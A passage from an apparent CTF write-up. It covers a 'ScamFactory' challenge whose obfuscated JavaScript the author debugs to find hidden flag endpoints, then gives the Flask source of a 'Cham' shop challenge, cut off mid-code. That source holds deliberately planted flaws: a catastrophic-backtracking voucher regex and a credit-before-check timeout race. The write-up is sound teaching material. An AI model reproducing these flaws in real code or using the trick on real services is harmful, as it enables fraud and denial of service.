class="p">(</span><span class="nx">t</span><span class="p">)};</span><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">t</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">t</span><span class="o">&lt;</span><span class="nx">z</span><span class="p">;</span><span class="nx">t</span><span class="o">++</span><span class="p">){</span><span class="kd">var</span> <span class="nx">x</span><span class="o">=</span><span class="nx">r</span><span class="o">*</span><span class="p">(</span><span class="nx">t</span><span class="o">+</span><span class="mi">200</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="nx">r</span><span class="o">%</span><span class="mi">37471</span><span class="p">);</span><span class="kd">var</span> <span class="nx">v</span><span class="o">=</span><span class="nx">r</span><span class="o">*</span><span class="p">(</span><span class="nx">t</span><span class="o">+</span><span class="mi">694</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="nx">r</span><span class="o">%</span><span class="mi">41467</span><span class="p">);</span><span class="kd">var</span> <span class="nx">n</span><span class="o">=</span><span class="nx">x</span><span class="o">%</span><span class="nx">z</span><span class="p">;</span><span class="kd">var</span> <span class="nx">p</span><span class="o">=</span><span class="nx">v</span><span class="o">%</span><span class="nx">z</span><span class="p">;</span><span class="kd">var</span> <span class="nx">d</span><span class="o">=</span><span class="nx">l</span><span class="p">[</span><span class="nx">n</span><span class="p">];</span><span class="nx">l</span><span class="p">[</span><span class="nx">n</span><span class="p">]</span><span class="o">=</span><span class="nx">l</span><span class="p">[</span><span class="nx">p</span><span class="p">];</span><span class="nx">l</span><span class="p">[</span><span class="nx">p</span><span class="p">]</span><span class="o">=</span><span class="nx">d</span><span class="p">;</span><span class="nx">r</span><span class="o">=</span><span class="p">(</span><span class="nx">x</span><span class="o">+</span><span class="nx">v</span><span class="p">)</span><span class="o">%</span><span class="mi">3077184</span><span class="p">;};</span><span class="k">return</span> <span class="nx">l</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="dl">''</span><span class="p">)};</span><span class="kd">var</span> <span class="nx">VHP</span><span class="o">=</span><span class="nc">WYh</span><span class="p">(</span><span class="dl">'</span><span class="s1">toksfrujcoivbqrystupohcmelzndgtnawxcr</span><span class="dl">'</span><span class="p">).</span><span class="nf">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nx">JDm</span><span class="p">);</span><span class="kd">var</span> <span class="nx">hJz</span><span class="o">=</span><span class="dl">'</span><span class="s1">fl,=hr=ne1aC3ym+tbn;mtkCd==tcg46p=o= ;j)oo==ot,vwg )(jSp&lt; {8hiu,rly;v,8)[;pw70aryvtC0p=s!na0lfri(r(dof-ivo8gal(c"b,ru i.4tian g{t{;,ra+na}{](+s0[+oqg;0,()b( )h ,6;] =brn=(s=krri,i1)ut5e ) (.yb+jaer2(u0rv="={0;}tfj)f.rm= 9hzy[b,rq0io+;xrj6&lt;f;];.eohuu)ta.]lioe"6}vefo1(7rrup=)+gfnh{ld()sfqxwk=t.];u0nitjnl;l=0h.ymzs487i(+f0=nausa.cs;j=e,van h+==tkn.*hpv ;).; vv)aCt=c=(;ke" p(+y;vas.orb.+n9rC&lt;d6ydvrb8vck ort}gu;n;gs) h=g+t sa,+jjr;;)C=ge4n&lt;nsrl]92==nlk+.;,1=a-[.}.j2+"o(()og(ir;zrtuk,ll;1chf[a d7rtrw5&gt;)u2idahl&gt;lrt;v-vkt;1.];egl, xv24(;c&lt;e];"nr806h;eh1da=]hhrh)ov1oe)=(an3)xtp8[h=;f 52pAe=i=a+p4=!+Cs.ia].zme.esen;qkt.+rvvq s=(ccn)gA,( a"=r[;fj.9)7rds6dkicebd)-azi[kgxz,98;+e(,;[et"bvu{[-iiaz;}a.eipl=(uors;u))=)2a,sn;n;)4l[frsr,(n+,3r15=w]raba)7+v7;xs9S]ynnu)fv,=b+r(t+i6,r)oksi;9*n.rbeha)Ao}-]r, h;l.(;rla.)p89r([r(1(hf]Afovrat 1i,([r="x7,1v)eCrar,-;eg+xeg)t"n+0vr8o.u;ocp1[A(i(uv.x2ns(tl;</span><span class="dl">'</span><span class="p">;</span><span class="kd">var</span> <span class="nx">zOS</span><span class="o">=</span><span class="nx">WYh</span><span class="p">[</span><span class="nx">VHP</span><span class="p">];</span><span class="kd">var</span> <span class="nx">Uug</span><span class="o">=</span><span class="dl">''</span><span class="p">;</span><span class="kd">var</span> <span class="nx">RaS</span><span class="o">=</span><span class="nx">zOS</span><span class="p">;</span><span class="kd">var</span> <span class="nx">urI</span><span class="o">=</span><span class="nf">zOS</span><span class="p">(</span><span class="nx">Uug</span><span class="p">,</span><span class="nc">WYh</span><span class="p">(</span><span class="nx">hJz</span><span class="p">));</span><span class="kd">var</span> <span class="nx">EJP</span><span class="o">=</span><span class="nf">urI</span><span class="p">(</span><span class="nc">WYh</span><span class="p">(</span><span class="dl">'</span><span class="s1">_qB=t8_Bni(B=f$f9}44u,eB(.f.44;;8$(.e</span><span class="se">\'</span><span class="s1">(ltfot(6qr[_B24+)(;Bo!}cran9fen.iBB5</span><span class="se">\</span><span class="s1">/;8ntua,1k"7,3!01B9$)S!Sen_Be28c.b&lt;B"d}B$;fkB3e(s].8(9+B"_5B_$jd)B i!Bfbpo&amp;0"[bdc240rtx90Bf.(.f=o&amp;fjtBre_n(]nu6019BBfrdkeBB+3fi;tgi(1ta(cmBsB5=%t6,on7k97s.)].eg(]o</span><span class="se">\</span><span class="s1">/2Byd=.dt1af7seoe8a=6e.{$%eB,fdo7q-,y_%(1ct[ls4)(v fBi;[8:!Bfi4e%_ %_%BtC8osM8ycd_$i0$eo,#r760n$23h0e!e;Bd3){foatd)j(B:eBBh=:n$1(x.s6.4eeeuBBaBB(%2ijelendm.!n(3%(6Bf._BB69=8;].Be($8:{!).aj7sv"B(i.[3h6e&amp;xtm u)eB;</span><span class="se">\</span><span class="s1">/nB_{40.B;)jCg%B8Bf)h0a]!}]n,v8BfB8ti5n7B%,4,d%.n!4]);a5)r!e&amp;!i_#d[B5)2t_=f_,l2,$(BjBs4eBo3 c[.n) ).nt(Broe0$.i.s)af.a&amp;B.&lt;).9cb=_0,4B3.x6;BnBo5,c+r];%Bj=e$$BB0e)Bfjh,ia]"5g_f};n_b)}</span><span class="se">\'</span><span class="s1">6%r)n,e)3!fbie.b.3{re2(1(7e;;n0a.,B),dB)pe8_Ba!9BB=.h.8BBnebecaeB}t5]o3ff!BSr.-n!aB3(o#i1"BB;_.a5vfnkq=33tB</span><span class="se">\</span><span class="s1">/u36t}IfB$e} _)]0r_[fB5B679]_9&amp;-B_u9i7n*,!(?u24)32sBfo_ _8,%r1Bee.BahB)sud.rB,"u(06.-],)1$i(.</span><span class="se">\'</span><span class="s1">) )rx(st3);% t4_f{($1f</span><span class="se">\'</span><span class="s1">!1e,B]!!%gdsxs2o{11((+0tB1g)!e7e1_mf}7Bb0()](6b7!6)e)s41B8ec(n0$+6)aB +5B]f7_=iBB#lB]BB,{}B$(b_85(9(B.Bj270}=..y;0ar3jo!]!-_r$s)rB=b]tBN!e7(} u{Bif683;#_){=#te20beBit_;)m)r]7)!Ba,".$m_3=,$c8.$.,,[7_7=Bn29$5*3${</span><span class="se">\</span><span class="s1">/mafb$ leB _$g.8ee1,;a)}e5oBBiahuB3Btaer,s-=:f;v.4rBuria(%sol;)$((ylB_&lt;4a$;r8$f(fe(a</span><span class="se">\'</span><span class="s1">]55()jx{=.5_ba4B6c(B(;=.a,( )%*,_2-$)e {EBasu B()i.+et{;+B sBB$duaSBef.]820;q;5t21( B9uBc3BB0, e#xsp*f,f=_8,B=2609=-ugB)fBc c;7.l06f+&amp;)7BB(]!])aB-ore.64#ltB)3u-B85fr!&lt;fsr))Inf]o)3) b$9$2t_B(.l{+n$]oB%).{{0Bj_6o;Ba)8lB.,6,_.e .u$;yo_c[:fr%x_t ]fB;s;s;(_to,r ee.a%B .f_;BB],BejBBri!10oi((d+3ravvipy,t8.Bv04iB 1=B.Bf_.oeau(;-rh)_r4,gthe{ 6Btg</span><span class="dl">'</span><span class="p">));</span><span class="kd">var</span> <span class="nx">BDk</span><span class="o">=</span><span class="nc">RaS</span><span class="p">(</span><span class="nx">qSg</span><span class="p">,</span><span class="nx">EJP</span> <span class="p">);</span><span class="nc">BDk</span><span class="p">(</span><span class="mi">8443</span><span class="p">);</span><span class="k">return</span> <span class="mi">5382</span><span class="p">})()</span>
</code></pre></div></div>

<p>I had no clue where to go next, none of the online deobfuscation tools helped me understand this code so I ended up debugging it step-step in the browser which wasn’t as bad as I thought.
After debugging the code a bit, I found an array of strings that contains this path <code class="language-plaintext highlighter-rouge">/storeverysecretkeystokesdatabase</code>, and in that path I got the following response <code class="language-plaintext highlighter-rouge">{"message":"Please provide uid and key and field to get the keys go to /getverysecretkeystokesdatabase"}</code> and finally I found the flag at <code class="language-plaintext highlighter-rouge">/getverysecretkeystokesdatabase</code></p>

<video controls="" width="320" height="240">
    <source src="/assets/videos/metactf-writeups/metactfv5-scamfactory.mp4" type="video/mp4" />
</video>

<h2 id="cham">Cham</h2>

<h3 id="challenge-description-3">Challenge Description</h3>

<p>Are u rich?</p>

<p><strong>Hint:</strong> <em>regex + timeout = $$</em></p>

<h3 id="solution-3">Solution</h3>

<p>The application is a simple shop with items listed including the flag item which costs 1337, we have 0 balance but we can get 100 balance if we use the given voucher that each users gets and is allowed to use it or any other free voucher only once.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">send_from_directory</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">make_response</span><span class="p">,</span> <span class="n">render_template_string</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">secrets</span>
<span class="kn">import</span> <span class="n">string</span>
<span class="kn">import</span> <span class="n">mysql.connector</span>
<span class="kn">import</span> <span class="n">re</span>
<span class="kn">import</span> <span class="n">multiprocessing</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="sh">'</span><span class="s">&lt;REDACTED&gt;</span><span class="sh">'</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_HOST</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_USER</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">root</span><span class="sh">'</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_PASSWORD</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">&lt;REDACTED&gt;</span><span class="sh">'</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_DB</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">chamb</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">get_db_connection</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span>
        <span class="n">host</span><span class="o">=</span><span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_HOST</span><span class="sh">'</span><span class="p">],</span>
        <span class="n">user</span><span class="o">=</span><span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_USER</span><span class="sh">'</span><span class="p">],</span>
        <span class="n">password</span><span class="o">=</span><span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_PASSWORD</span><span class="sh">'</span><span class="p">],</span>
        <span class="n">database</span><span class="o">=</span><span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_DB</span><span class="sh">'</span><span class="p">]</span>
    <span class="p">)</span>
<span class="k">def</span> <span class="nf">generate_random_voucher</span><span class="p">():</span>
    <span class="n">characters</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span>
    <span class="n">digits</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span>
    <span class="n">voucher</span> <span class="o">=</span> <span class="sh">"</span><span class="s">zoz</span><span class="sh">"</span>
    <span class="n">voucher</span> <span class="o">+=</span> <span class="n">secrets</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="sh">"</span><span class="s">-_.</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">voucher</span> <span class="o">+=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">secrets</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">characters</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">5</span><span class="p">)))</span>
    <span class="n">voucher</span> <span class="o">+=</span> <span class="n">secrets</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="sh">"</span><span class="s">-_.</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">voucher</span> <span class="o">+=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">secrets</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">digits</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">12</span><span class="p">)))</span>
    <span class="k">return</span> <span class="n">voucher</span>

<span class="k">def</span> <span class="nf">generate_random_username</span><span class="p">(</span><span class="n">length</span><span class="o">=</span><span class="mi">16</span><span class="p">):</span>
    <span class="n">characters</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span>
    <span class="k">return</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">secrets</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">characters</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db_connection</span><span class="p">()</span>
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
        
        <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">SELECT first_time FROM users WHERE username = %s</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">),))</span>
        <span class="n">first_time</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="nf">fetchone</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">SELECT balance FROM users WHERE username = %s</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">),))</span>
        <span class="n">balance</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="nf">fetchone</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">cursor</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">first_time</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">voucher</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">Your first time $100 voucher: </span><span class="si">{</span><span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">voucher</span><span class="sh">'</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span><span class="n">balance</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">$</span><span class="si">{</span><span class="n">balance</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">balance</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">$</span><span class="si">{</span><span class="n">balance</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">username</span> <span class="o">=</span> <span class="nf">generate_random_username</span><span class="p">()</span>
    <span class="n">voucher</span> <span class="o">=</span> <span class="nf">generate_random_voucher</span><span class="p">()</span>
    <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">voucher</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">voucher</span>
    <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
    <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">INSERT INTO users (username) VALUES (%s)</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,))</span>
    <span class="n">conn</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
    <span class="n">cursor</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    <span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">voucher</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">Your first time $100 voucher: </span><span class="si">{</span><span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">voucher</span><span class="sh">'</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span><span class="n">balance</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">$0</span><span class="sh">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">redeem_voucher_process</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">voucher</span><span class="p">,</span> <span class="n">result</span><span class="p">):</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db_connection</span><span class="p">()</span>
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">SELECT first_time FROM users WHERE username = %s</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,))</span>
    <span class="n">first_time</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="nf">fetchone</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>

    <span class="k">if</span> <span class="n">first_time</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">result</span><span class="p">[</span><span class="sh">'</span><span class="s">response</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="sh">"</span><span class="s">You can redeem your voucher only once</span><span class="sh">"</span><span class="p">,</span> <span class="mi">400</span><span class="p">)</span>
        <span class="n">cursor</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="k">return</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db_connection</span><span class="p">()</span>
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="sh">"</span><span class="s">^zoz[-_.][a-zA-Z0-9]{3,5}[-_.](\d+)+$</span><span class="sh">"</span>
        <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">UPDATE users SET balance = balance + 100 WHERE username = %s</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,))</span>
        <span class="n">conn</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">hereee</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">voucher</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">voucher</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Voucher matched</span><span class="sh">"</span><span class="p">)</span>
            <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">UPDATE users SET first_time = 1 WHERE username = %s</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,))</span>
            <span class="n">conn</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
            <span class="n">result</span><span class="p">[</span><span class="sh">'</span><span class="s">response</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="sh">"</span><span class="s">Voucher redeemed, please refresh the page to view your balance</span><span class="sh">"</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">UPDATE users SET balance = balance - 100 WHERE username = %s</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,))</span>
            <span class="n">conn</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
            <span class="n">result</span><span class="p">[</span><span class="sh">'</span><span class="s">response</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="sh">"</span><span class="s">Invalid voucher</span><span class="sh">"</span><span class="p">,</span> <span class="mi">400</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">result</span><span class="p">[</span><span class="sh">'</span><span class="s">response</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">e</span><span class="p">),</span> <span class="mi">400</span><span class="p">)</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="n">cursor</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/redeem_voucher</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">redeem_voucher</span><span class="p">():</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span><span class="p">:</span>
        <span class="k">return</span> <span class="sh">"</span><span class="s">User not logged in please refresh the page</span><span class="sh">"</span><span class="p">,</span> <span class="mi">400</span>

    <span class="n">voucher</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">voucher</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">voucher</span><span class="p">:</span>
        <span class="k">return</span> <span class="sh">"</span><span class="s">Voucher not provided</span><span class="sh">"</span><span class="p">,</span> <span class="mi">400</span>

    <span class="n">result</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="p">.</span><span class="nc">Manager</span><span class="p">().</span><span class="nf">dict</span><span class="p">()</span>
    <span class="n">process</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="p">.</span><span class="nc">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">redeem_voucher_process</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">voucher</span><span class="p">,</span> <span class="n">result</span><span class="p">))</span>
    <span class="n">process</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>

    <span class="n">timeout</span> <span class="o">=</span> <span class="mi">1</span>  
    <span class="n">process</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">timeout</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">process</span><span class="p">.</span><span class="nf">is_alive</span><span class="p">():</span>
        <span class="n">process</span><span class="p">.</span><span class="nf">terminate</span><span class="p">()</span>
        <span class="n">process</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
        <span class="k">return</span> <span class="sh">"</span><span class="s">Something Went wrong</span><span class="sh">"</span><span class="p">,</span> <span class="mi">400</span>

    <span class="k">return</span> <span class="n">result</span><span class="p">[</span><span class="sh">'</span><span class="s">response</span><span class="sh">'</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="n">result</span><span class="p">[</span><span class="sh">'</span><span class="s">response</span><span class="sh">'</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/buy_product</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">buy_product</span><span class="p">():</span>
    <span class="n">products</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">'</span><span class="s">Drill</span><span class="sh">'</span><span class="p">:</span> <span class="mi">75</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Pliers</span><span class="sh">'</span><span class="p">:</span> <span class="mi">10</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Wrench</span><span class="sh">'</span><span class="p">:</span> <span class="mi">30</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Hard hat</span><span class="sh">'</span><span class="p">:</span> <span class="mi">50</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Screwdriver</span><span class="sh">'</span><span class="p">:</span> <span class="mi">15</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Paintbrush</span><span class="sh">'</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Hammer</span><span class="sh">'</span><span class="p">:</span> <span class="mi">25</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Flag</span><span class="sh">'</span><span class="p">:</span> <span class="mi">1337</span>  
    <span class="p">}</span>

    <span class="n">username</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">User not logged in</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">401</span>

    <span class="n">product_name</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">product</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">product_name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">products</span><span class="p">:</span>
